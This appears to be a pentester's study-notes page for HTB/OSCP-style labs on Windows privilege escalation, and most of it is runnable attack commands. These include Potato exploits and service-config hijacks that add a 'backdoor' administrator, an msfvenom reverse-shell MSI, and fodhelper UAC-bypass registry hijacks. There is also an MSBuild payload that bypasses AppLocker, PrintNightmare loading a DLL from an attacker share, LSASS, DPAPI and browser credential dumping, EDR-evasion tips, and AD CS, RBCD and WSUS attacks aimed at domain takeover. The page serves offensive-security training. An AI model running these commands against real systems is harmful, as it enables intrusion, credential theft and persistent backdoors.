+++
title = 'Enumerating Attack Vectors (Windows)'
date = 2026-10-30
type = 'notes'
weight = 10
toc = true
tags = ['windows', 'privilege-escalation', 'enumeration', 'tokens']
+++

Windows privilege escalation is usually a **configuration flaw**, not a missing patch. The highest-value paths are token-impersonation privileges, weak service ACLs, credential material left on disk, and Active Directory misconfigurations. Kernel exploits exist but are secondary. This file is organized by **payoff-per-minute**, not by category.

---

## Helpful Tools

### Miscellaneous

- [Ghostpack Compiled Binaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- [UACME](https://github.com/hfiref0x/UACME) — UAC bypass techniques
- [Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [NetCat for Windows](https://github.com/int0x33/nc.exe/)

### Exploit Suggesters

- **winPEAS** — broad automated enumeration
- **Seatbelt** — C# host-survey tool
- **PowerUp** / **SharpUp** — PowerShell/C# privilege-escalation checks
- **JAWS** — PowerShell 2.0 enumeration
- **Watson** — missing-KB enumeration
- **WES-NG** — Windows Exploit Suggester Next Generation
- **Metasploit** — `use post/multi/recon/local_exploit_suggester` on a backgrounded meterpreter session

### Credentials and Token Abuse

- **LaZagne** — credential recovery from many sources
- **Mimikatz** — LSASS dumping, PtH, PtT, golden tickets
- **SessionGopher** — saved remote-access session information
- **SharpDPAPI** — DPAPI triage and decryption (`triage`, `rdg`, `credentials`, `masterkeys`, `machinetriage`)
- **SharpChrome** — Chrome credential extraction

### Current 2026 tooling

| Tool | What it adds | Install |
|---|---|---|
| **Certipy** | AD CS enumeration and exploitation (`certipy find -u … -p … -dc-ip … -stdout -vulnerable`) — covers **ESC1 through ESC17** as of 2026 | `pip install certipy-ad` |
| **Certify** | C# AD CS enumeration — often more reliable in restricted PowerShell environments | Ghostpack binaries |
| **SharpWSUS** | Fake-update injection via WSUS to push a signed binary with malicious arguments | GitHub: `netero1010/SharpWSUS` |
| **Rubeus** | Kerberos abuse — unconstrained delegation capture, S4U, ticket extraction | Ghostpack binaries |
| **FullPowers** | Recovers the default privilege set on `LOCAL SERVICE` / `NETWORK SERVICE` tokens that have been filtered | GitHub: `itm4n/FullPowers` |
| **SigmaPotato** / **PrintNotifyPotato** | Modern Potato variants with reflection/in-memory execution; the latter abuses PrintNotify COM when the Spooler is disabled | GitHub forks |
| **Nanodump** / **lsassy** | Stealthy LSASS dumping and remote parsing | `pip install lsassy` |
| **DonPwner** / **nxcspray** | Safe password spraying respecting AD lockout policy | `pipx install nxc` |

---

## Priority Execution Order — Stop at the First Root-Equivalent Primitive

Run this before the detailed sections. Most HTB/OSCP hosts fall in the first four checks.

| # | Check | Command | Payoff |
|---|---|---|---|
| **1** | Token privileges | `whoami /priv` — look for `SeImpersonatePrivilege`, `SeAssignPrimaryToken`, `SeBackup`, `SeRestore`, `SeTakeOwnership`, `SeDebug`, `SeLoadDriver` | Potato attack → SYSTEM; `SeDebug` → LSASS dump |
| **2** | Service ACLs and binaries | `accesschk.exe /accepteula -uwcqv %USERNAME% *` and `icacls "C:\path\to\service.exe"` | `SERVICE_CHANGE_CONFIG` or writable binary → SYSTEM |
| **3** | Unquoted service paths | `wmic service get name,displaypathname,startmode \| findstr /i "auto" \| findstr /i /v "C:\Windows\\" \| findstr /i /v "\""` | Writable parent directory → SYSTEM |
| **4** | Credentials on disk | `cmdkey /list`, `dir /s /b *.rdp *.config *.vnc *.cred 2>nul`, PSReadLine history, DPAPI triage | Plaintext or crackable credentials |
| **5** | AlwaysInstallElevated | Both HKCU and HKLM keys must be `0x1` | MSI executes as SYSTEM |
| **6** | UAC (if local admin) | `whoami /groups \| findstr "Mandatory"` — Medium integrity? | UAC bypass → High integrity |
| **7** | AD CS (if domain-joined) | `certipy find -vulnerable` | ESC1–ESC17 → Domain Admin |
| **8** | Kernel / missing patches | `systeminfo`, WES-NG, Watson | Last resort — stability risk |

> **Rule:** If check 1 returns `SeImpersonatePrivilege`, stop and run a Potato. If check 2 returns `SERVICE_CHANGE_CONFIG`, stop and reconfigure the service. Only continue down the list if the earlier checks are closed.

---

## Token Impersonation and Potato Attacks

### Why this is the highest-value check

`SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege` are held by **default on service accounts** — IIS AppPool identities, MSSQL service accounts, and many `NETWORK SERVICE` / `LOCAL SERVICE` contexts. A web shell or SQL `xp_cmdshell` almost always lands in one of these. The privilege allows a process to impersonate a token it can obtain a handle to, and a privileged token can be coerced from a Windows service via DCOM or a named pipe — yielding **`NT AUTHORITY\SYSTEM`**.

### Enumeration

```cmd
whoami /priv
whoami /priv | findstr /i "Impersonate AssignPrimaryToken Backup Restore TakeOwnership Debug LoadDriver"
```

If `whoami /priv` shows a **filtered** token without `SeImpersonate` on a `LOCAL SERVICE` / `NETWORK SERVICE` account, recover the default privilege set first with **FullPowers**, then retry the Potato:

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
```

### Choosing the right Potato by Windows version and surface

| Tool | Target / surface | Notes |
|---|---|---|
| **GodPotato** | **Windows Server 2012 – 2022, Windows 10/11** | Most reliable modern default — works across the widest range |
| **PrintSpoofer** | Windows 10 / Server 2016–2019 | Requires the **Print Spooler** service running. The go-to modern Potato for turning `SeImpersonate` into SYSTEM |
| **RoguePotato** | Server 2019+ | Requires **outbound TCP 135** to your OXID resolver (`-r <attacker_ip>`) |
| **SweetPotato** | COM / WebAssembly escalation | `-a "/c whoami"` |
| **JuicyPotato** | Windows ≤ Server 2016, Win10 **< 1809 only** | Uses BITS CLSID; **dead on 1809+** |
| **JuicyPotatoNG** | Some 1809+ / Server 2019 builds | Revives the local-COM technique where JP is dead |
| **EfsPotato** / **SharpEfsPotato** | MS-EFSR coercion | Works when RoguePotato’s OXID resolver is blocked |
| **SigmaPotato** | Modern Windows | Reflection / in-memory execution — better against EDR |
| **PrintNotifyPotato** | Modern Windows, Spooler disabled | Abuses PrintNotify COM service — often works when the classic Spooler path is hardened |
| **DCOMPotato** | Server 2019+ | DCOM-based coercion alternative |

**Version-based decision rule:**

- **1809+ / Server 2019+** → **GodPotato** or **PrintSpoofer** first; **RoguePotato** if outbound 135 is allowed; **EfsPotato** if 135 is blocked.
- **Win10 < 1809 / ≤ Server 2016** → **JuicyPotato**.
- **Spooler disabled** → **PrintNotifyPotato**, **EfsPotato**, or **DCOMPotato**.
- **EDR present** → **SigmaPotato** (in-memory) before dropping a binary.

### Worked examples

```cmd
:: GodPotato — broadest compatibility
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c net user backdoor P@ss123! /add && net localgroup Administrators backdoor /add"

:: PrintSpoofer
.\PrintSpoofer.exe -i -c cmd

:: RoguePotato — requires outbound 135 to the attacker OXID resolver
.\RoguePotato.exe -r ATTACKER_IP -e "cmd.exe /c <payload>" -l 9999

:: JuicyPotato (legacy only)
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c <payload>" -t * -c {CLSID}

:: EfsPotato
.\EfsPotato.exe "whoami"

:: SweetPotato
.\SweetPotato.exe -a "/c whoami"
```

> **Detection note:** Defenders signature the classic Potato binaries. A Defender-clean in-memory meterpreter or a `scarecrow`-loaded payload avoids the on-disk signature while preserving the same `SeImpersonate` primitive.

### Other token privileges worth checking

| Privilege | Primitive |
|---|---|
| **`SeDebugPrivilege`** | Dump LSASS (`procdump -ma lsass.exe`, `rundll32 comsvcs.dll MiniDump`, Nanodump) → credentials |
| **`SeBackupPrivilege`** | Read any file regardless of ACL — copy `SAM`, `SYSTEM`, `NTDS.dit` via `robocopy /b` or `diskshadow` |
| **`SeRestorePrivilege`** | Write any file regardless of ACL — replace a service binary or `utilman.exe` |
| **`SeTakeOwnershipPrivilege`** | Take ownership of any object — `takeown /f C:\Windows\System32\utilman.exe` |
| **`SeLoadDriverPrivilege`** | Load a vulnerable signed driver (BYOVD) → kernel → SYSTEM |
| **`SeTcbPrivilege`** | Act as part of the operating system — create a token for any user |

---

## Enumerating Windows Protection

```powershell
# Defender status
Get-MpComputerStatus

# AppLocker rules
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Test AppLocker against a binary
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

# WDAC / CLM — check if PowerShell is in Constrained Language Mode
$ExecutionContext.SessionState.LanguageMode
```

If `LanguageMode` returns **`ConstrainedLanguage`**, AppLocker or WDAC is enforcing CLM. See the **AppLocker, WDAC, and CLM Bypass** section below.

---

## Processes, Jobs, Scheduled Tasks

```powershell
# Running processes
Get-Process
tasklist /svc

# Named pipes — useful for Potato coercion surfaces
pipelist.exe /accepteula
gci \\.\pipe\
accesschk.exe /accepteula \\.\Pipe\lsass -v

# Scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask | select TaskName,State

# ACL of the task file (not the Action binary)
Get-Acl C:\Windows\System32\Tasks\<TaskName>
schtasks /query /tn <TaskName> /xml
```

> **Key distinction:** `Get-Acl` on the **task file** tells you who can modify the task definition. The escalation path is usually the **Action binary** — check `icacls` on the executable the task runs. A writable Action binary is a direct SYSTEM path.

### Unquoted service paths

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

For a path like `C:\Program Files\My App\service.exe`, Windows tries:

1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My App\service.exe`

If any intermediate directory is writable, drop the payload there:

```cmd
icacls "C:\Program Files\My App\" | findstr /i "everyone\|users\|(F)\|(W)"
sc stop <service>; sc start <service>
```

### Weak service permissions

```cmd
:: Find services the current user can modify
accesschk.exe /accepteula -uwcqv %USERNAME% *

:: Check the service binary ACL
icacls "C:\path\to\service.exe"
```

If `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG` is present:

```cmd
sc config <service> binpath= "cmd /c net user backdoor P@ss123! /add && net localgroup Administrators backdoor /add"
sc stop <service>; sc start <service>
```

If the **binary itself** is writable, replace it with a payload and restart the service.

---

## Kernel and OS

```cmd
set                          :: environment variables — paths, credentials
systeminfo                   :: full config, hotfixes
wmic qfe                     :: patches
wmic product get name        :: installed programs (slow; Win32_Product triggers reconfiguration)
Get-WmiObject -Class Win32_Product | select Name, Version
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

> **`wmic product get name` is slow and noisy** — it invokes the MSI reconfiguration for every product. Prefer registry uninstall keys (see **Installed Applications**).

---

## Registries

### AlwaysInstallElevated

**Both** keys must be `0x1` — checking only one produces false positives.

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```bash
# Generate an MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o shell.msi
```

```cmd
msiexec /quiet /qn /i shell.msi
```

The installer runs as **SYSTEM**.

### Other high-value registry locations

```cmd
:: PuTTY saved sessions — clear-text proxy and host credentials
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\

:: Winlogon autologon — AutoAdminLogon, DefaultUserName, DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

:: VNC passwords (RealVNC / TightVNC / UltraVNC)
reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v Password
```

---

## Users and Groups

```cmd
query user                        :: logged-in users
echo %USERNAME%                   :: current user
whoami /priv                      :: privileges — see Token section
whoami /groups                    :: groups and integrity level
net user                          :: all local users
net localgroup                    :: all local groups
net localgroup administrators     :: administrators
net accounts                      :: password and lockout policy
Get-LocalUser                     :: description fields often contain hints
runas /user:backupadmin cmd       :: run as another user (requires password)
```

> **Integrity level check:** `whoami /groups | findstr "Mandatory"` — `Medium Mandatory Level` means you are a local admin with a filtered token and **UAC is the remaining barrier**; `High Mandatory Level` means you already have full admin.

---

## Network-Related

```cmd
netstat -ano
ipconfig /all
arp -a
route print
```

---

## Installed Applications

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Look for outdated, custom, or “enterprise” software with known local privilege-escalation CVEs.

---

## Credential Hunting

### Files and strings

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
findstr /spin "password" *.*
dir /S /B *pass*.txt *pass*.xml *pass*.ini *cred* *vnc* *.config* 2>nul
```

```powershell
select-string -Path C:\Users\*\Documents\*.txt -Pattern password
Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

### Saved credentials and histories

```cmd
cmdkey /list                                     :: Credential Manager entries
netsh wlan show profile WIFINAME key=clear       :: Wi-Fi passwords
```

```powershell
# PowerShell history — one of the highest-yield sources
gc (Get-PSReadLineOption).HistorySavePath
foreach($user in ((ls C:\users).fullname)){
  cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}

# SessionGopher
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01

# Chrome credentials
.\SharpChrome.exe logins /unprotect

# Sticky Notes
C:\Users\<Username>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

### KeePass

```bash
python2.7 keepass2john.py file.kdbx > hash
hashcat -m 13400 hash rockyou.txt
```

> **KDBX v4** needs a current `keepass2john`; older versions report `File version 40000` and fail. Use Hashcat `-m 13400` with the current script.

### DPAPI — the frequently-overlooked source

DPAPI is how Windows stores “remembered” secrets — Credential Manager entries, saved RDP passwords, browser logins, Wi-Fi keys, and scheduled-task credentials. In a user’s context you can decrypt them; as **SYSTEM** or with the **domain backup key** you can decrypt anyone’s.

**Credential Manager storage:**

```cmd
%APPDATA%\Microsoft\Credentials\        :: Credential Manager
%APPDATA%\Microsoft\Protect\<SID>\      :: masterkeys
%LOCALAPPDATA%\Microsoft\Vault\         :: Windows Vault
%USERPROFILE%\AppData\Local\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

**Decryption:**

```cmd
:: In the user's context — decrypts transparently with the logged-on masterkey
SharpDPAPI.exe triage          :: credentials, vaults, RDP, browser
SharpDPAPI.exe rdg             :: saved RDP / RDCMan.settings passwords
SharpDPAPI.exe credentials

:: Mimikatz equivalents
mimikatz # dpapi::cred /in:%APPDATA%\Microsoft\Credentials\<blob>
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

**As SYSTEM or in a domain** — extract all users’ masterkeys, or use the domain backup key offline:

```cmd
mimikatz # sekurlsa::dpapi                    :: masterkeys from LSASS (needs SYSTEM/SeDebug)
mimikatz # lsadump::backupkeys /system:dc01   :: domain backup key (DA)
SharpDPAPI.exe machinetriage                  :: SYSTEM masterkey
```

`SharpDPAPI.exe triage` is the comprehensive wrapper — it runs all user DPAPI extraction commands in a single pass, triaging credentials, vaults, RDG files, and certificates for every accessible user.

---

## UAC Bypass (Local Admin → High Integrity)

> **UAC is not a security boundary.** Microsoft has stated this repeatedly — it is a convenience feature that nudges an administrator toward running day-to-day work with a **filtered (medium-integrity) token**, keeping the full high-integrity token a click away. For a pentester who already has code execution as a local admin, UAC is the last speed bump before writing to protected paths, loading drivers, dumping LSASS, or installing persistence.

### Precondition

```cmd
whoami /groups | findstr "Mandatory"
:: Medium Mandatory Level → local admin with filtered token → UAC bypass applies
:: High Mandatory Level → already full admin
```

### How the bypass works

Certain **Microsoft-signed** binaries in trusted directories (`C:\Windows\System32`) have an embedded manifest with **`autoElevate` set to true**. When launched, they silently jump to the full token without a prompt — provided the UAC level is the default “Notify me only when apps try to make changes”.

The exploit primitive: many auto-elevating binaries read configuration from **`HKEY_CURRENT_USER`** — a hive a medium-integrity process can write to freely. Plant a command in a registry key that the high-integrity process later reads, and your command inherits high integrity.

### Enumerate auto-elevating binaries

```cmd
sigcheck.exe -m C:\Windows\System32\fodhelper.exe | findstr /i autoElevate
```

```powershell
Get-ChildItem C:\Windows\System32\*.exe | ForEach-Object {
  if ((Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue) -match 'autoElevate.*true') {
    $_.Name
  }
}
```

### Registry-hijack family

| Binary | Hijacked key |
|---|---|
| **`fodhelper.exe`** | `HKCU\Software\Classes\ms-settings\Shell\Open\command` |
| **`computerdefaults.exe`** | `HKCU\Software\Classes\ms-settings\Shell\Open\command` |
| **`sdclt.exe`** | `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe` |
| **`eventvwr.exe`** | `HKCU\Software\Classes\mscfile\shell\open\command` |

**Fodhelper example — the canonical registry hijack:**

```cmd
:: Plant the hijack in HKCU (medium integrity can do this)
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe /c <payload>" /f

:: Trigger the auto-elevating binary
fodhelper.exe

:: Clean up
reg delete "HKCU\Software\Classes\ms-settings" /f
```

`fodhelper.exe` auto-elevates and opens the `ms-settings:` protocol. Windows resolves that handler through **HKCU first** — creating the handler key with an empty `DelegateExecute` value and pointing the default at your payload makes `fodhelper` run your command as high integrity, with no prompt.

### Other bypass families

- **`sdclt.exe`** — `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`.
- **`eventvwr.exe`** — `HKCU\Software\Classes\mscfile\shell\open\command`.
- **DLL sideloading** — a trusted auto-elevating binary loads a DLL from a writable directory.
- **`IFileOperation` COM proxying** — the original UACME technique, combined with the trailing-space trick to write into real System32 without a prompt.
- **UACME** (`Akagi`) — a maintained collection of dozens of bypasses indexed by Windows build. Use the build number from `systeminfo` to pick a working method.

> **Detection note:** the minimum-truth signal is an **auto-elevating binary spawning an unexpected child process** — `fodhelper.exe`, `eventvwr.exe`, `ComputerDefaults.exe`, or `sdclt.exe` launching `cmd`, `powershell`, or a non-Microsoft binary.

---

## AppLocker, WDAC, and CLM Bypass

If `Get-AppLockerPolicy` returns rules, or if `$ExecutionContext.SessionState.LanguageMode` returns `ConstrainedLanguage`, the host is enforcing application control. CLM is enforced when AppLocker or WDAC policies are active.

### Technique 1 — PowerShell version downgrade

```powershell
powershell -version 2
```

PowerShell v2 **predates CLM**, so it runs in FullLanguage mode. This is the most common CLM bypass, and it works unless v2 has been explicitly removed.

### Technique 2 — `PSByPassCLM` via custom runspace

Compile a C# executable that creates a PowerShell runspace **without** CLM. If AppLocker allows execution from a path rule (e.g. `C:\Windows\Tasks` is writable by all), the binary runs and opens a FullLanguage runspace.

```powershell
C:\Windows\Tasks\BypassCLM.exe
```

### Technique 3 — MSBuild inline task execution

`MSBuild.exe` is a Microsoft-signed binary frequently allowed by AppLocker. An inline task in a `.proj` file executes arbitrary C# — bypassing both the binary block and CLM.

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Exec">
    <TaskFactory />
  </Target>
  <UsingTask TaskName="TaskFactory" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Fragment" Language="cs">
        System.Diagnostics.Process.Start("cmd.exe", "/c <payload>");
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe task.proj
```

### Technique 4 — `pwsh` (PowerShell 6+)

```powershell
pwsh -c "<payload>"
```

PowerShell 7 (`pwsh`) is a separate binary; WDAC/AppLocker rules written for `powershell.exe` often do not cover it.

> **WDAC is harder than AppLocker.** WDAC enforcement happens **in the kernel before PowerShell initializes**, so CLM cannot be turned off from within the session. The reliable path is a **signed** binary or a **LOLBAS** proxy that is explicitly allowed — not a script-level bypass.

---

## PrintNightmare (CVE-2021-34527)

A flaw in the Windows Print Spooler’s **`RpcAddPrinterDriverEx`** that lets an authenticated user load an arbitrary DLL as **`NT AUTHORITY\SYSTEM`** — both local privilege escalation and, against a remote spooler, remote code execution.

### Enumeration

```cmd
:: Is the Spooler running?
sc query spooler
Get-Service Spooler

:: Is the host vulnerable? (patch level + Point and Print settings)
systeminfo
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

### Local exploitation (public PowerShell PoC)

Host the malicious DLL on an SMB share reachable by the target, then invoke the PoC:

```powershell
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "backdoor" -NewPassword "P@ss123!"
# or with a custom DLL:
Invoke-Nightmare -DLL "\\ATTACKER\share\evil.dll"
```

The Spooler loads the DLL **as SYSTEM**.

> **Hardening note:** After PrintNightmare, many environments disabled the Spooler or restricted Point and Print. If `Spooler` is stopped, use **PrintNotifyPotato** or **EfsPotato** for the `SeImpersonate` primitive instead.

---

## AD CS — ESC1 to ESC17

Misconfigurations in **Active Directory Certificate Services** can allow a low-privileged user to escalate to **Domain Admin**. SpecterOps’ “ESC” numbering classifies these scenarios; as of **2026, ESC1 through ESC17** have been identified.

### Enumeration

```bash
certipy find -u user@domain.local -p 'Password' -dc-ip DC_IP -stdout -vulnerable
```

Certipy’s `find` output flags individual vulnerable templates and CA settings, which you then chain into an attack.

### The highest-value ESCs

| ESC | Condition | Primitive |
|---|---|---|
| **ESC1** | Template has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, an authentication EKU, permissive enrollment rights, and no approval/signature gates | Request a certificate with an arbitrary SAN (e.g. `administrator@corp.local`) and authenticate as that user |
| **ESC8** | NTLM relay to AD CS **HTTP enrollment** endpoints | Coerce a DC / privileged host authentication and relay it to the CA to request a certificate |
| **ESC9** | `CT_FLAG_NO_SECURITY_EXTENSION` + weak certificate mapping | Request a cert with a mismatched UPN and map it to a privileged account |
| **ESC7** | Dangerous CA permissions (`ManageCA` / `ManageCertificates`) | Approve your own failed requests or issue arbitrary certificates |
| **ESC2/ESC3** | Any-Purpose EKU or enrollment-agent templates | Use an enrollment agent certificate to request a cert on behalf of another user |

### Worked example — ESC1

```bash
# 1. Request a certificate as a privileged user via the vulnerable template
certipy req -u lowpriv@domain.local -p 'Password' -ca CORP-CA -template VulnTemplate \
  -upn administrator@domain.local -dc-ip DC_IP

# 2. Authenticate with the issued certificate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

The CA trusts the template’s insecure configuration and issues a certificate with the administrator’s identity in the SAN.

> **Tooling note:** **Certipy** is the maintained Python implementation; **Certify** is the C# equivalent and is often more reliable when PowerShell is restricted. Both cover the same ESC surface.

---

## Kerberos Delegation

Three delegation mechanisms exist, and all three are exploitable when misconfigured.

| Type | Configuration | Attack |
|---|---|---|
| **Unconstrained** | Account/computer trusted to “delegate any service” | Coerce a privileged authentication to the trusted host and capture its TGT with **Rubeus** `monitor` / `triage`; reuse the TGT |
| **Constrained (KCD)** | `msDS-AllowedToDelegateTo` lists specific SPNs | Abuse **S4U2Self + S4U2Proxy** to request a service ticket for a privileged target |
| **Resource-based constrained (RBCD)** | Target’s `msDS-AllowedToActOnBehalfOfOtherIdentity` is writable | If you have **write access over a computer object**, set RBCD to your own controlled account and impersonate any user against that host — the most common modern delegation path |

### Enumeration

```powershell
# Unconstrained
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Constrained
Get-ADObject -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo

# RBCD — look for write access over computer objects
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

### RBCD attack sketch

```bash
# 1. Create / control a computer account (MachineAccountQuota > 0)
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Password123' -dc-ip DC_IP domain.local/user:pass

# 2. Set RBCD on the target to allow EVIL$ to impersonate anyone
rbcd.py -delegate-to 'TARGET$' -delegate-from 'EVIL$' -action write -dc-ip DC_IP domain.local/user:pass

# 3. Request a service ticket as administrator
getST.py -spn cifs/target.domain.local -impersonate administrator -dc-ip DC_IP 'domain.local/EVIL$:Password123'

# 4. Use the ticket
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass target.domain.local
```

---

## LAPS — Local Administrator Password Solution

**LAPS** stores local administrator passwords on the computer object in AD — `ms-Mcs-AdmPwd` (legacy, cleartext) or `msLAPS-Password` (Windows LAPS, often DPAPI-NG-encrypted).

**A user delegated to read the LAPS attribute** — or a group mistakenly granted `ReadProperty` — can retrieve the local admin password for that machine via a simple LDAP query. This is a conditional path from **ordinary account management to local administrator access**.

### Enumeration

```powershell
# Who can read LAPS passwords in an OU?
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password for a specific computer
Get-ADComputer TARGET -Properties ms-Mcs-AdmPwd | select ms-Mcs-AdmPwd

# Modern Windows LAPS
Get-ADComputer TARGET -Properties msLAPS-Password | select msLAPS-Password
```

> **Encrypted Windows LAPS:** directory read permission and password-decryption authority are **separate requirements** — `msLAPS-Password` is often DPAPI-NG-encrypted and needs `pylaps` / LAPSv2.0 to decrypt.

---

## WSUS Abuse

WSUS only requires the payload to be a **Microsoft-signed binary**. **SharpWSUS** creates a fake update wrapping a legitimate signed binary (such as PsExec) with malicious command-line arguments, then approves and cleans up fake updates targeted at specific downstream clients.

### Enumeration

```powershell
# Find the WSUS server from the registry
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
```

### Attack sketch

```cmd
:: 1. Create a malicious "patch" wrapping a signed binary with arguments
SharpWSUS.exe create /payload:"C:\Tools\PsExec.exe" /args:"-accepteula -s -d cmd /c <payload>" /title:"Critical Update"

:: 2. Approve it for the target group
SharpWSUS.exe approve /updateid:<id> /computername:<target> /groupname:"Downstream Computers"

:: 3. Check delivery
SharpWSUS.exe check /updateid:<id>

:: 4. Clean up
SharpWSUS.exe delete /updateid:<id> /computername:<target>
```

This is both a **lateral-movement** and **privilege-escalation** primitive — the payload executes as **SYSTEM** on the target client when WSUS delivers the “update”.

---

## Field Notes from the HTB List

- **GPP `cpassword`.** `Groups.xml` in SYSVOL (or the DFS-R `Replication` share) decrypts instantly with `gpp-decrypt` — it is not a hash to crack. (Active, Forest)
- **`runas /savecred`.** Saved credentials can be launched without the password; `cmdkey /list` shows them, but the new window is only useful to launch a reverse shell (Access).
- **Alternate data streams:** `dir /R` reveals `file.txt:secret`; read with `Get-Content -Stream` or `more < file.txt:secret` (Jeeves).
- **WSL artifacts:** a Linux shell on Windows may leave `/root/.bash_history` or a `rootfs` under `%LOCALAPPDATA%\Packages\...` — search it before assuming Windows-only creds (Secnotes).
- **Browser and session loot:** Firefox `sessionstore-backups`, process dumps, PSReadLine history (Heist, Giddy).
- **`--local-auth` matters.** A hash from a local SAM is not a domain account; using `-d DOMAIN` with it fails. (Querier, Signed)
- **Unprivileged users cannot query services** — read `HKLM\SYSTEM\CurrentControlSet\Services` directly and check service binary ACLs with `icacls` (Giddy).
- **`whoami /priv` is the first command.** A `SeImpersonate` on an IIS or MSSQL service account is a GodPotato away from SYSTEM — do not start with kernel exploits.
- **DPAPI is often the fastest path.** `SharpDPAPI.exe triage` on a user profile frequently recovers a saved RDP or domain credential that is more valuable than a local admin.

Full context: [HTB Windows machines](/notes/oscp-labs/windows/).

---

## Quick Reference — Technique → Precondition → Payoff

| Technique | Precondition | Payoff |
|---|---|---|
| **Potato (GodPotato/PrintSpoofer)** | `SeImpersonatePrivilege` | `NT AUTHORITY\SYSTEM` |
| **SeDebugPrivilege** | `whoami /priv` shows `SeDebug` | LSASS dump → credentials |
| **SeBackup / SeRestore** | Privilege present | Read/write any file → SAM, SYSTEM, NTDS.dit, service binary |
| **Unquoted service path** | Writable intermediate directory | SYSTEM via dropped binary |
| **Weak service ACL** | `SERVICE_CHANGE_CONFIG` | SYSTEM via `binpath` change |
| **AlwaysInstallElevated** | Both HKCU + HKLM keys = `0x1` | MSI as SYSTEM |
| **UAC bypass (fodhelper)** | Medium-integrity local admin | High-integrity token, no prompt |
| **DPAPI triage** | User profile access | Saved RDP / Credential Manager / browser secrets |
| **AD CS ESC1** | Vulnerable template + enrollment rights | Domain Admin certificate |
| **AD CS ESC8** | HTTP enrollment endpoint | NTLM relay → certificate → DA |
| **RBCD** | Write access over a computer object | Impersonate any user against that host |
| **LAPS read** | `ReadProperty` on LAPS attribute | Local admin password → host takeover |
| **WSUS (SharpWSUS)** | WSUS server reachable | SYSTEM on downstream clients |
| **CLM bypass (`-version 2`)** | AppLocker/WDAC CLM | FullLanguage PowerShell |
| **PrintNightmare** | Spooler running, unpatched | SYSTEM via DLL load |

---

This file sits alongside the **Password Attacks** and **Privileged Groups** notes: token privileges and service ACLs are the Windows equivalent of Linux capabilities and group membership — check them first, before kernel exploits and before deep AD enumeration.
